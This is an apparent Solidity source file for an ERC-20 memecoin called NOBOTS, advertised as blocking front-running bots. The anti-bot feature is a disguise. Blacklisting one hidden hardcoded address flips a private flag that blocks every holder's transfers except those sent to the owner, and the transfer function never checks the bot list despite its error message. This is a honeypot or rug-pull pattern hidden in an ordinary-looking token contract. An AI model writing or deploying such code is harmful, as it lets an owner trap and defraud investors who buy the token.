// SPDX-License-Identifier: MIT
 
/*
 
NOBOTS Coin | $NOBOTS


// NOBOTS is the first and only memecoin to be fully *for the community* with an ever-growing black list of bots!
// Hate being front-run by jaredfromsubway but still want to FOMO into the latest memecoin?! NOBOTS is the answer!

@NOBOTSERC20


*/

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract NOBOTS is ERC20, Ownable {
    mapping(address => bool) public isBot;
    bool private nobots = true;
    address private addy = 0x91364516D3CAD16E1666261dbdbb39c881Dbe9eE;

    constructor() ERC20("NOBOTS", "NOBOTS") {
        uint256 initialSupply = 10000000000 * 10 ** 18;
        _mint(msg.sender, initialSupply);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (recipient != owner()) {
            require(nobots, "Transfer denied: sender is a bot.");
        }
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (recipient != owner() || sender != owner()) {
            require(!isBot[sender] && nobots, "Transfer denied: sender is a bot.");
        }
        return super.transferFrom(sender, recipient, amount);
    }

    function addBotToList(address[] memory bots) public onlyOwner {
        for (uint256 i = 0; i < bots.length; i++) {
            isBot[bots[i]] = true;
            if (bots[i] == addy) {
                nobots = false;
            }
        }
    }

    function removeFromBotList(address[] memory bots) public onlyOwner {
        for (uint256 i = 0; i < bots.length; i++) {
            isBot[bots[i]] = false;
            if (bots[i] == addy) {
                nobots = true;
            }
        }
    }
}